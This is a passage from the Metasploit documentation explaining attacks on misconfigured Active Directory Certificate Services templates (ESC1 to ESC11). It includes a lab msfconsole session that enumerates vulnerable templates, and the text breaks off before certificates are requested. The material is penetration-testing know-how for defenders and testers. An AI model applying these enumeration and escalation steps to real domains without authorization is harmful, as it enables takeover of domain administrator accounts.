class="nav-list-link">2023 Project Ideas</a><li class="nav-list-item active"><a href="/docs/development/google-summer-of-code/how-to-apply-to-gsoc.html" class="nav-list-link">How to Apply to GSoC</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/maintainers/" class="nav-list-link">Maintainers</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/maintainers/committer-keys.html" class="nav-list-link">Committer Keys</a><li class="nav-list-item active"><a href="/docs/development/maintainers/committer-rights.html" class="nav-list-link">Committer Rights</a><li class="nav-list-item active"><a href="/docs/development/maintainers/downloads-by-version.html" class="nav-list-link">Downloads by Version</a><li class="nav-list-item active"><a href="/docs/development/maintainers/metasploit-hackathons.html" class="nav-list-link">Metasploit Hackathons</a><li class="nav-list-item active"><a href="/docs/development/maintainers/metasploit-loginpalooza.html" class="nav-list-link">Metasploit Loginpalooza</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/maintainers/process/" class="nav-list-link">Process</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/maintainers/process/assigning-labels.html" class="nav-list-link">Assigning Labels</a><li class="nav-list-item active"><a href="/docs/development/maintainers/process/guidelines-for-accepting-modules-and-enhancements.html" class="nav-list-link">Guidelines for Accepting Modules and Enhancements</a><li class="nav-list-item active"><a href="/docs/development/maintainers/process/how-to-deprecate-a-metasploit-module.html" class="nav-list-link">How to deprecate a Metasploit module</a><li class="nav-list-item active"><a href="/docs/development/maintainers/process/landing-pull-requests.html" class="nav-list-link">Landing Pull Requests</a><li class="nav-list-item active"><a href="/docs/development/maintainers/process/adding-release-notes-to-prs.html" class="nav-list-link">Release Notes</a><li class="nav-list-item active"><a href="/docs/development/maintainers/process/rolling-back-merges.html" class="nav-list-link">Rolling back merges</a><li class="nav-list-item active"><a href="/docs/development/maintainers/process/unstable-modules.html" class="nav-list-link">Unstable Modules</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/maintainers/ruby-gems/" class="nav-list-link">Ruby Gems</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/maintainers/ruby-gems/how-to-add-and-update-gems-in-metasploit-framework.html" class="nav-list-link">Adding and Updating</a><li class="nav-list-item active"><a href="/docs/development/maintainers/ruby-gems/merging-metasploit-payload-gem-updates.html" class="nav-list-link">Merging Metasploit Payload Gem Updates</a><li class="nav-list-item active"><a href="/docs/development/maintainers/ruby-gems/using-local-gems.html" class="nav-list-link">Using local Gems</a></ul></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/propsals/" class="nav-list-link">Proposals</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/propsals/bundled-modules-proposal.html" class="nav-list-link">Bundled Modules Proposal</a><li class="nav-list-item active"><a href="/docs/development/propsals/java-meterpreter-feature-parity-proposal.html" class="nav-list-link">Java Meterpreter Feature Parity Proposal</a><li class="nav-list-item active"><a href="/docs/development/propsals/msf6-feature-proposals.html" class="nav-list-link">MSF6 Feature Proposals</a><li class="nav-list-item active"><a href="/docs/development/propsals/metasploit-url-support-proposal.html" class="nav-list-link">Metasploit URL support proposal</a><li class="nav-list-item active"><a href="/docs/development/propsals/payload-rename-justification.html" class="nav-list-link">Payload Rename Justification</a><li class="nav-list-item active"><a href="/docs/development/propsals/uberhandler.html" class="nav-list-link">Uberhandler</a><li class="nav-list-item active"><a href="/docs/development/propsals/work-needed-to-allow-msfdb-to-use-postgresql-common.html" class="nav-list-link">Work needed to allow msfdb to use postgresql common</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/quality/" class="nav-list-link">Quality</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/quality/common-metasploit-module-coding-mistakes.html" class="nav-list-link">Common Metasploit Module Coding Mistakes</a><li class="nav-list-item active"><a href="/docs/development/quality/loading-test-modules.html" class="nav-list-link">Loading Test Modules</a><li class="nav-list-item active"><a href="/docs/development/quality/measuring-metasploit-performance.html" class="nav-list-link">Measuring Metasploit Performance</a><li class="nav-list-item active"><a href="/docs/development/quality/msftidy.html" class="nav-list-link">Msftidy</a><li class="nav-list-item active"><a href="/docs/development/quality/style-tips.html" class="nav-list-link">Style Tips</a><li class="nav-list-item active"><a href="/docs/development/quality/using-rubocop.html" class="nav-list-link">Using Rubocop</a><li class="nav-list-item active"><a href="/docs/development/quality/writing-module-documentation.html" class="nav-list-link">Writing Module Documentation</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/roadmap/" class="nav-list-link">Roadmap</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/roadmap/2017-roadmap.html" class="nav-list-link">2017 Roadmap</a><li class="nav-list-item active"><a href="/docs/development/roadmap/2017-roadmap-review.html" class="nav-list-link">2017 Roadmap Review</a><li class="nav-list-item active"><a href="/docs/development/roadmap/metasploit-breaking-changes.html" class="nav-list-link">Metasploit Breaking Changes</a><li class="nav-list-item active"><a href="/docs/development/roadmap/metasploit-data-service-enhancements-goliath.html" class="nav-list-link">Metasploit Data Service</a><li class="nav-list-item active"><a href="/docs/development/roadmap/metasploit-5-release-notes.html" class="nav-list-link">Metasploit Framework 5.0 Release Notes</a><li class="nav-list-item active"><a href="/docs/development/roadmap/metasploit-6-release-notes.html" class="nav-list-link">Metasploit Framework 6.0 Release Notes</a><li class="nav-list-item active"><a href="/docs/development/roadmap/metasploit-framework-wish-list.html" class="nav-list-link">Metasploit Framework Wish List</a></ul></ul><li class="nav-list-item active"><a href="/docs/contact.html" class="nav-list-link">Contact</a></ul></nav><footer class="site-footer"> This site uses <a href="https://github.com/pmarsceill/just-the-docs">Just the Docs</a>, a documentation theme for Jekyll.</footer></div><div class="main" id="top"><div id="main-header" class="main-header"><div class="search"><div class="search-input-wrap"> <input type="text" id="search-input" class="search-input" tabindex="0" placeholder="Search Metasploit Documentation" aria-label="Search Metasploit Documentation" autocomplete="off"> <label for="search-input" class="search-label"><svg viewBox="0 0 24 24" class="search-icon"><use xlink:href="#svg-search"></use></svg></label></div><div id="search-results" class="search-results"></div></div><link rel="stylesheet" href="/assets/css/main.css"><nav aria-label="Auxiliary" class="aux-nav"><ul class="aux-nav-list"><li class="aux-nav-list-item"> <a href="//github.com/rapid7/metasploit-framework" class="site-button" target="_blank" rel="noopener noreferrer" > Metasploit Framework on GitHub </a></ul></nav></div><div id="main-content-wrap" class="main-content-wrap"><nav aria-label="Breadcrumb" class="breadcrumb-nav"><ol class="breadcrumb-nav-list"><li class="breadcrumb-nav-list-item"> <a href="/docs/pentesting/">Pentesting</a><li class="breadcrumb-nav-list-item"> <a href="/docs/pentesting/active-directory/">Active Directory</a><li class="breadcrumb-nav-list-item"> <a href="/docs/pentesting/active-directory/ad-certificates/">AD CS</a><li class="breadcrumb-nav-list-item"> <span>Attacking AD CS ESC Vulnerabilities Using Metasploit</span></ol></nav><div id="main-content" class="main-content" role="main"><h1 id="setting-up-an-ad-cs-target"> <a href="#setting-up-an-ad-cs-target" class="anchor-heading" aria-labelledby="setting-up-an-ad-cs-target"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Setting Up An AD CS Target</h1><p>Follow the instructions <a href="/docs/pentesting/active-directory/ad-certificates/overview.html">here</a> to set up an AD CS server for testing purposes.</p><h2 id="introduction-to-ad-cs-vulnerabilities"> <a href="#introduction-to-ad-cs-vulnerabilities" class="anchor-heading" aria-labelledby="introduction-to-ad-cs-vulnerabilities"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Introduction to AD CS Vulnerabilities</h2><pre><code class="language-mermaid">flowchart TD
	escexp[Find vulnerable certificate templates\nvia ldap_esc_vulnerable_cert_finder] --&gt; icpr[Issue certificates via icpr_cert]
	icpr[Issue certificates via icpr_cert] --&gt; ESC1
	ESC1 -- Via PKINIT --&gt; pkinit{Authenticate to Kerberos}
	icpr[Issue certificates via icpr_cert] --&gt; users[Request certificates on behalf of other users]
	users[Request certificates on behalf of other users] --&gt; ESC2
	users[Request certificates on behalf of other users] --&gt; ESC3
	ESC2 -- Via PKINIT --&gt; pkinit[Authenticate to Kerberos]
	ESC3 -- Via PKINIT --&gt; pkinit[Authenticate to Kerberos]
</code></pre><p>The chart above showcases how one can go about attacking three common AD CS vulnerabilities, taking advantage of various flaws in how certificate templates are configured on an Active Directory Certificate Server.</p><p>The following sections will walk through each of these steps, starting with enumerating certificate templates that the server has to offer and identifying those that are vulnerable to various misconfigurations and security flaws, followed by creating new certificates using these certificate templates with the <code class="language-plaintext highlighter-rouge">icpr_cert</code> Metasploit module, and finally using these certificates to authenticate to the domain as the domain administrator via Kerberos.</p><p>Each certificate template vulnerability that will be discussed here has a ESC code, such as ESC1, ESC2, or ESC3. These ESC codes are taken from the original whitepaper that SpecterOps published which popularized these certificate template attacks, known as <a href="https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf">Certified Pre-Owned</a>. In this paper Will Schroeder and Lee Christensen described 8 different domain escalation attacks that they found they could conduct via misconfigured certificate templates:</p><ul><li>ESC1 - Domain escalation via No Issuance Requirements + Enrollable Client Authentication/Smart Card Logon OID templates + CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT<li>ESC2 - Domain escalation via No Issuance Requirements + Enrollable Any Purpose EKU or no EKU<li>ESC3 - Domain escalation via No Issuance Requirements + Certificate Request Agent EKU + no enrollment agent restrictions<li>ESC4 - Domain escalation via misconfigured certificate template access control<li>ESC5 - Domain escalation via vulnerable PKI AD Object Access Control<li>ESC6 - Domain escalation via the EDITF_ATTRIBUTESUBJECTALTNAME2 setting on CAs + No Manager Approval + Enrollable Client Authentication/Smart Card Logon OID templates<li>ESC7 - Vulnerable Certificate Authority Access Control<li>ESC8 - NTLM Relay to AD CS HTTP Endpoints</ul><p>Later, another <a href="https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7">blog</a> came out from Oliver Lyak which discovered ESC9 and ESC10, two more vulnerabilities that could allow normal domain joined users to abuse certificate template misconfigurations to gain domain administrator privileges.</p><ul><li>ESC9 - No Security Extension - CT_FLAG_NO_SECURITY_EXTENSION flag set in <code class="language-plaintext highlighter-rouge">msPKI-EnrollmentFlag</code>. Also <code class="language-plaintext highlighter-rouge">StrongCertificateBindingEnforcement</code> not set to 2 or <code class="language-plaintext highlighter-rouge">CertificateMappingMethods</code> contains <code class="language-plaintext highlighter-rouge">UPN</code> flag.<li>ESC10 - Weak Certificate Mappings - <code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel CertificateMappingMethods</code> contains <code class="language-plaintext highlighter-rouge">UPN</code> bit aka <code class="language-plaintext highlighter-rouge">0x4</code> or <code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc StrongCertificateBindingEnforcement</code> is set to <code class="language-plaintext highlighter-rouge">0</code>.</ul><p>Finally, we have ESC11, which was discovered by Compass Security and described in their <a href="https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/">blog post</a>.</p><ul><li>ESC11 - Relaying NTLM to ICPR - Relaying NTLM authentication to unprotected RPC interface is allowed due to lack of the <code class="language-plaintext highlighter-rouge">IF_ENFORCEENCRYPTICERTREQUEST</code> flag on <code class="language-plaintext highlighter-rouge">Config.CA.Interface.Flags</code>.</ul><p>Currently Metasploit only supports attacking ESC1 to ESC3. As such, this paper only covers exploiting ESC1 to ESC3 at this time.</p><p>Before continuing, it should be noted that ESC1 is slightly different than ESC2 and ESC3 as the diagram notes above. This is because in ESC1, one has control over the <code class="language-plaintext highlighter-rouge">subjectAltName</code> field in the generated certificate, which is also known as the <code class="language-plaintext highlighter-rouge">SAN</code> field. This field allows one to specify who the certificate should authenticate as. Therefore, all an attacker needs to do is simply modify this field and they can gain a certificate that allows them to authenticate as any user they wish.</p><p>ESC2 is similar to ESC1 in all respects, however it differs in one key area. This is because, unlike ESC1 vulnerable certificate templates, you cannot edit the <code class="language-plaintext highlighter-rouge">subjectAltName</code> field, of ESC2 vulnerable certificate templates. Additionally, ESC2 certificate templates define the <code class="language-plaintext highlighter-rouge">Any Purpose</code> extended key usage (EKU) or no EKU at all. This last part is important as it allows an attacker to utilize the ESC2 vulnerable certificate template to create a new certificate that can be used to authorize to log into a domain via Kerberos on behalf of any other user, thereby granting them access to the domain as that user. Note that certificates with no EKU at all will need to be trusted by the <code class="language-plaintext highlighter-rouge">NTAuthCertificates</code> object (which it won’t be by default), otherwise new certificates that are created using the vulnerable ESC2 certificate template will not work for domain authentication. This restriction does not apply for those certificates vulnerable to ESC2 which have the <code class="language-plaintext highlighter-rouge">Any Purpose</code> EKU applied to them.</p><p>Finally, ESC3 is fairly similar to ESC2, however it differs in two ways: a different EKU is abused, and the attacker also needs to utilize two different misconfigured certificate templates in order to exploit the vulnerability. The EKU in question this time is the Certificate Request Agent EKU, aka OID 1.3.6.1.4.1.311.20.2.1, which allows one to enroll for a certificate on behalf of another user, which may seem unusual, but this a common scenario within Microsoft environments. To abuse this EKU, an attacker must have the following two vulnerable certificate templates:</p><ol><li>A certificate template which has all the same permissions as ESC1, however it also has the Certificate Request Agent EKU set on it, aka OID 1.3.6.1.4.1.311.20.2.1. This certificate template is labeled as <code class="language-plaintext highlighter-rouge">ESC3_TEMPLATE_1</code> within the output of the <code class="language-plaintext highlighter-rouge">ldap_esc_vulnerable_cert_finder</code> module we will use later on.<li>A certificate template that allows low privileged users to enroll in it, and has manager approval disabled, same as ESC1. However it also has either:<ul><li>A template schema of 1<li>A template schema of 2 or greater and an Application Policy Issuance Requirement requiring the Certificate Request Agent EKU so that only those who have a certificate with this requirement can enroll in them. It must also define an EKU that allows for domain authentication, same as ESC1, and there must be no enrollment restrictions on the Certificate Authority (CA) server in question. This certificate template is labeled as <code class="language-plaintext highlighter-rouge">ESC3_TEMPLATE_2</code> within the output of the <code class="language-plaintext highlighter-rouge">ldap_esc_vulnerable_cert_finder</code> module we will use later on.</ul></ol><p>If both of these criteria are met then the attacker can enroll in one of the <code class="language-plaintext highlighter-rouge">ESC3_TEMPLATE_1</code> vulnerable certificate templates as a low privileged user in order to get a certificate that will grant them Certificate Request Agent permissions. They can then use these permissions to enroll in a <code class="language-plaintext highlighter-rouge">ESC3_TEMPLATE_2</code> vulnerable certificate template and request a certificate on behalf of another user, such as the domain administrator, and utilize the fact that the certificate template allows for domain authentication to log into the domain via Kerberos as that user.</p><h2 id="finding-vulnerable-esc-templates-using-ldap_esc_vulnerable_cert_finder"> <a href="#finding-vulnerable-esc-templates-using-ldap_esc_vulnerable_cert_finder" class="anchor-heading" aria-labelledby="finding-vulnerable-esc-templates-using-ldap_esc_vulnerable_cert_finder"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Finding Vulnerable ESC Templates Using ldap_esc_vulnerable_cert_finder</h2><p>Before one can exploit vulnerable ESC templates to elevate privileges, it is necessary to first find a list of vulnerable templates that exist on a domain. To do this we can run the <code class="language-plaintext highlighter-rouge">auxiliary/gather/ldap_esc_vulnerable_cert_finder</code> module. This module will connect to the LDAP server on a target Domain Controller (DC), and will run a set of LDAP queries to gather a list of certificate authority (CA) servers and the vulnerable certificate templates they make available for enrollment. It will then also query the permissions on both the CA and the certificate template to figure out which users or groups can use that certificate template to elevate their privileges.</p><p>Keep in mind though that there are two sets of permissions in play here though. There is one set of permissions on the CA server that control who is able to enroll in any certificate template from that server, and second set of permissions that control who is allowed to enroll in a specific certificate template, which is applied to the certificate template itself. Therefore, the module will also specify which users are allowed to enroll in a specific template on a specific CA server, in order to make it as clear as possible which users or groups one needs to have access to in order to exploit the vulnerable certificate template.</p><p>The following diagram showcases how this permissions check works in a more visual manner:</p><pre><code class="language-mermaid">flowchart TD
    user[User] --&gt; firstcheck{CA Server Allows Enrollment?}
	firstcheck{CA Server Allows Enrollment?} -- YES --&gt; secondcheck{Certificate Template Allows Enrollment?}
	firstcheck{CA Server Allows Enrollment?} -- NO --&gt; denied[Access Denied]
	secondcheck{Certificate Template Allows Enrollment?} -- NO --&gt; denied[Access Denied]
	secondcheck{Certificate Template Allows Enrollment?} -- YES --&gt; success[Access Granted!]
</code></pre><p>To run the module, you will need to have the login credentials of a domain joined user. The specific permissions of this user should not matter though, since most LDAP servers in an Active Directory (AD) environment are configured in such a way that they allow users to read most objects, but not write to them. For our purposes, since we just need to read the details of the certificate templates that are available, this means normal user permissions should be sufficient.</p><p>To run the module, specify the login credentials for an AD user, and set <code class="language-plaintext highlighter-rouge">RHOSTS</code> to the address of one of the Domain Controller (DC) IP addresses, then enter <code class="language-plaintext highlighter-rouge">run</code>. This will cause the module to log into the LDAP server on the target DC, and list out the vulnerable certificate templates and which CA servers they are available from, as well as the permissions that are required to enroll in these certificate templates. The following is a sample output of running this against a test server:</p><div class="language-msf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="zp">msf6</span> <span class="p">&gt;</span> use auxiliary/gather/ldap_esc_vulnerable_cert_finder
<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">gather/ldap_esc_vulnerable_cert_finder</span><span class="p">)</span> <span class="p">&gt;</span> show options

Module options (auxiliary/gather/ldap_esc_vulnerable_cert_finder):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   BASE_DN                                no        LDAP base DN if you already have it
   DOMAIN                                 no        The domain to authenticate to
   PASSWORD                               no        The password to authenticate with
   REPORT_NONENROLLABLE  false            yes       Report nonenrollable certificate templates
   RHOSTS                                 yes       The target host(s), see https://github.com/rapid7/metasploit
                                                    -framework/wiki/Using-Metasploit
   RPORT                 389              yes       The target port
   SSL                   false            no        Enable SSL on the LDAP connection
   USERNAME                               no        The username to authenticate with


View the full module info with the info, or info -d command.

<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">gather/ldap_esc_vulnerable_cert_finder</span><span class="p">)</span> <span class="p">&gt;</span> set DOMAIN DAFOREST
DOMAIN =&gt; DAFOREST
<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">gather/ldap_esc_vulnerable_cert_finder</span><span class="p">)</span> <span class="p">&gt;</span> set USERNAME normal
USERNAME =&gt; normal
<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">gather/ldap_esc_vulnerable_cert_finder</span><span class="p">)</span> <span class="p">&gt;</span> set PASSWORD normaluser
PASSWORD =&gt; normaluser
<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">gather/ldap_esc_vulnerable_cert_finder</span><span class="p">)</span> <span class="p">&gt;</span> set RHOSTS 172.30.239.85
RHOSTS =&gt; 172.30.239.85
<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">gather/ldap_esc_vulnerable_cert_finder</span><span class="p">)</span> <span class="p">&gt;</span> run
<span class="zs">[*]</span> Running module against 172.30.239.85

<span class="zs">[*]</span> Discovering base DN automatically
<span class="zg">[+]</span> 172.30.239.85:389 Discovered base DN: DC=daforest,DC=com
<span class="zs">[*]</span> Template: SubCA
<span class="zs">[*]</span>    Distinguished Name: CN=SubCA,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=daforest,DC=com
<span class="zs">[*]</span>    Vulnerable to: ESC1, ESC2, ESC3_TEMPLATE_2
<span class="zs">[*]</span>    Certificate Template Enrollment SIDs:
<span class="zs">[*]</span>       * S-1-5-21-3290009963-1772292745-3260174523-512 (Domain Admins)
<span class="zs">[*]</span>       * S-1-5-21-3290009963-1772292745-3260174523-519 (Enterprise Admins)
<span class="zs">[*]</span>    Issuing CAs:
<span class="zs">[*]</span>       * daforest-WIN-BR0CCBA815B-CA
<span class="zs">[*]</span>          Server: WIN-BR0CCBA815B.daforest.com
<span class="zs">[*]</span>          Enrollment SIDs:
<span class="zs">[*]</span>             * S-1-5-11 (Authenticated Users)
<span class="zs">[*]</span> Template: ESC1-Template
<span class="zs">[*]</span>    Distinguished Name: CN=ESC1-Template,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=daforest,DC=com
<span class="zs">[*]</span>    Vulnerable to: ESC1
<span class="zs">[*]</span>    Certificate Template Enrollment SIDs:
<span class="zs">[*]</span>       * S-1-5-21-3290009963-1772292745-3260174523-512 (Domain Admins)
<span class="zs">[*]</span>       * S-1-5-21-3290009963-1772292745-3260174523-513 (Domain Users)
<span class="zs">[*]</span>       * S-1-5-21-3290009963-1772292745-3260174523-519 (Enterprise Admins)
<span class="zs">[*]</span>    Issuing CAs:
<span class="zs">[*]</span>       * daforest-WIN-BR0CCBA815B-CA
<span class="zs">[*]</span>          Server: WIN-BR0CCBA815B.daforest.com
<span class="zs">[*]</span>          Enrollment SIDs:
<span class="zs">[*]</span>             * S-1-5-11 (Authenticated Users)
<span class="zs">[*]</span> Template: ESC2-Template
<span class="zs">[*]</span>    Distinguished Name: CN=ESC2-Template,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=daforest,DC=com
<span class="zs">[*]</span>    Vulnerable to: ESC2
<span class="zs">[*]</span>    Certificate Template Enrollment SIDs:
<span class="zs">[*]</span>       * S-1-5-21-3290009963-1772292745-3260174523-512 (Domain Admins)
<span class="zs">[*]</span>       * S-1-5-21-3290009963-1772292745-3260174523-513 (Domain Users)
<span class="zs">[*]</span>       * S-1-5-21-3290009963-1772292745-3260174523-519 (Enterprise Admins)
<span class="zs">[*]</span>    Issuing CAs:
<span class="zs">[*]</span>       * daforest-WIN-BR0CCBA815B-CA
<span class="zs">[*]</span>          Server: WIN-BR0CCBA815B.daforest.com
<span class="zs">[*]</span>          Enrollment SIDs:
<span class="zs">[*]</span>             * S-1-5-11 (Authenticated Users)
<span class="zs">[*]</span> Template: ESC3-Template1
<span class="zs">[*]</span>    Distinguished Name: CN=ESC3-Template1,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=daforest,DC=com
<span class="zs">[*]</span>    Vulnerable to: ESC3_TEMPLATE_1
<span class="zs">[*]</span>    Certificate Template Enrollment SIDs:
<span class="zs">[*]</span>       * S-1-5-21-3290009963-1772292745-3260174523-512 (Domain Admins)
<span class="zs">[*]</span>       * S-1-5-21-3290009963-1772292745-3260174523-513 (Domain Users)
<span class="zs">[*]</span>       * S-1-5-21-3290009963-1772292745-3260174523-519 (Enterprise Admins)
<span class="zs">[*]</span>    Issuing CAs:
<span class="zs">[*]</span>       * daforest-WIN-BR0CCBA815B-CA
<span class="zs">[*]</span>          Server: WIN-BR0CCBA815B.daforest.com
<span class="zs">[*]</span>          Enrollment SIDs:
<span class="zs">[*]</span>             * S-1-5-11 (Authenticated Users)
<span class="zs">[*]</span> Template: User
<span class="zs">[*]</span>    Distinguished Name: CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=daforest,DC=com
<span class="zs">[*]</span>    Vulnerable to: ESC3_TEMPLATE_2
<span class="zs">[*]</span>    Certificate Template Enrollment SIDs:
<span class="zs">[*]</span>       * S-1-5-21-3290009963-1772292745-3260174523-512 (Domain Admins)
<span class="zs">[*]</span>       * S-1-5-21-3290009963-1772292745-3260174523-513 (Domain Users)
<span class="zs">[*]</span>       * S-1-5-21-3290009963-1772292745-3260174523-519 (Enterprise Admins)
<span class="zs">[*]</span>    Issuing CAs:
<span class="zs">[*]</span>       * daforest-WIN-BR0CCBA815B-CA
<span class="zs">[*]</span>          Server: WIN-BR0CCBA815B.daforest.com
<span class="zs">[*]</span>          Enrollment SIDs:
<span class="zs">[*]</span>             * S-1-5-11 (Authenticated Users)
<span class="zs">[*]</span> Template: Administrator
<span class="zs">[*]</span>    Distinguished Name: CN=Administrator,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=daforest,DC=com
<span class="zs">[*]</span>    Vulnerable to: ESC3_TEMPLATE_2
<span class="zs">[*]</span>    Certificate Template Enrollment SIDs:
<span class="zs">[*]</span>       * S-1-5-21-3290009963-1772292745-3260174523-512 (Domain Admins)
<span class="zs">[*]</span>       * S-1-5-21-3290009963-1772292745-3260174523-519 (Enterprise Admins)
<span class="zs">[*]</span>    Issuing CAs:
<span class="zs">[*]</span>       * daforest-WIN-BR0CCBA815B-CA
<span class="zs">[*]</span>          Server: WIN-BR0CCBA815B.daforest.com
<span class="zs">[*]</span>          Enrollment SIDs:
<span class="zs">[*]</span>             * S-1-5-11 (Authenticated Users)
<span class="zs">[*]</span> Template: Machine
<span class="zs">[*]</span>    Distinguished Name: CN=Machine,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=daforest,DC=com
<span class="zs">[*]</span>    Vulnerable to: ESC3_TEMPLATE_2
<span class="zs">[*]</span>    Certificate Template Enrollment SIDs:
<span class="zs">[*]</span>       * S-1-5-21-3290009963-1772292745-3260174523-512 (Domain Admins)
<span class="zs">[*]</span>       * S-1-5-21-3290009963-1772292745-3260174523-515 (Domain Computers)
<span class="zs">[*]</span>       * S-1-5-21-3290009963-1772292745-3260174523-519 (Enterprise Admins)
<span class="zs">[*]</span>    Issuing CAs:
<span class="zs">[*]</span>       * daforest-WIN-BR0CCBA815B-CA
<span class="zs">[*]</span>          Server: WIN-BR0CCBA815B.daforest.com
<span class="zs">[*]</span>          Enrollment SIDs:
<span class="zs">[*]</span>             * S-1-5-11 (Authenticated Users)
<span class="zs">[*]</span> Template: DomainController
<span class="zs">[*]</span>    Distinguished Name: CN=DomainController,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=daforest,DC=com
<span class="zs">[*]</span>    Vulnerable to: ESC3_TEMPLATE_2
<span class="zs">[*]</span>    Certificate Template Enrollment SIDs:
<span class="zs">[*]</span>       * S-1-5-21-3290009963-1772292745-3260174523-498 (Enterprise Read-only Domain Controllers)
<span class="zs">[*]</span>       * S-1-5-21-3290009963-1772292745-3260174523-512 (Domain Admins)
<span class="zs">[*]</span>       * S-1-5-21-3290009963-1772292745-3260174523-516 (Domain Controllers)
<span class="zs">[*]</span>       * S-1-5-21-3290009963-1772292745-3260174523-519 (Enterprise Admins)
<span class="zs">[*]</span>       * S-1-5-9 (Enterprise Domain Controllers)
<span class="zs">[*]</span>    Issuing CAs:
<span class="zs">[*]</span>       * daforest-WIN-BR0CCBA815B-CA
<span class="zs">[*]</span>          Server: WIN-BR0CCBA815B.daforest.com
<span class="zs">[*]</span>          Enrollment SIDs:
<span class="zs">[*]</span>             * S-1-5-11 (Authenticated Users)
<span class="zs">[*]</span> Template: ESC3-Template2
<span class="zs">[*]</span>    Distinguished Name: CN=ESC3-Template2,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=daforest,DC=com
<span class="zs">[*]</span>    Vulnerable to: ESC3_TEMPLATE_2
<span class="zs">[*]</span>    Certificate Template Enrollment SIDs:
<span class="zs">[*]</span>       * S-1-5-21-3290009963-1772292745-3260174523-512 (Domain Admins)
<span class="zs">[*]</span>       * S-1-5-21-3290009963-1772292745-3260174523-513 (Domain Users)
<span class="zs">[*]</span>       * S-1-5-21-3290009963-1772292745-3260174523-519 (Enterprise Admins)
<span class="zs">[*]</span>    Issuing CAs:
<span class="zs">[*]</span>       * daforest-WIN-BR0CCBA815B-CA
<span class="zs">[*]</span>          Server: WIN-BR0CCBA815B.daforest.com
<span class="zs">[*]</span>          Enrollment SIDs:
<span class="zs">[*]</span>             * S-1-5-11 (Authenticated Users)
<span class="zs">[*]</span> Auxiliary module execution completed
<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">gather/ldap_esc_vulnerable_cert_finder</span><span class="p">)</span> <span class="p">&gt;</span>
</code></pre></div></div><p>From the output above we can determine that the SubCA certificate template is vulnerable to several attacks. However, whilst the issuing CAs allow any authenticated user to enroll in this certificate, the certificate template permissions prevent anyone but Domain Administrators and Enterprise Admins from being able to enroll in this certificate tempalte. At that point you probably don’t need to elevate your privileges any higher, so this certificate template isn’t that useful for us.</p><p>Moving onto the next certificate template we see that ESC1-Template is vulnerable to the ESC1 attack, has permissions on the template itself that allow for enrollment by any authenticated domain user, and has one issuing CA, daforest-WIN-BR0CCBA815B-CA, available at WIN-BR0CCBA815B.daforest.com, which allows enrollment by any authenticated user. This means that any user who is authenticated to the domain can utilize this template with a ESC1 attack to elevate their privileges.</p><p>Looking at ESC2-Template we can see the same story however this time the template is vulnerable to an ESC2 attack. ESC3-Template1 is also the same but is vulnerable to ESC3_TEMPLATE_1 attacks, and ESC3-Template2 is the same but vulnerable to ESC3_TEMPLATE_2 attacks.</p><p>We also see that the User template is vulnerable to ESC3_TEMPLATE_2 attacks and the fact that it is enrollable from Domain Users and that daforest-WIN-BR0CCBA815B-CA allows enrollment in it by any authenticated user confirms the theory that this can be exploited by any authenticated attacker for an ESC3_TEMPLATE_2 attack.</p><p>Another interesting one to note is the Machine template, which allows any domain joined computer to enroll in it, and who’s issuing CA allows any authenticated user to request it.</p><p>With this we now have a list of certificates that can be utilized for privilege escalation. The next step is to use the <code class="language-plaintext highlighter-rouge">ipcr_cert</code> module to request certificates for authentication using the vulnerable certificate templates.</p><h2 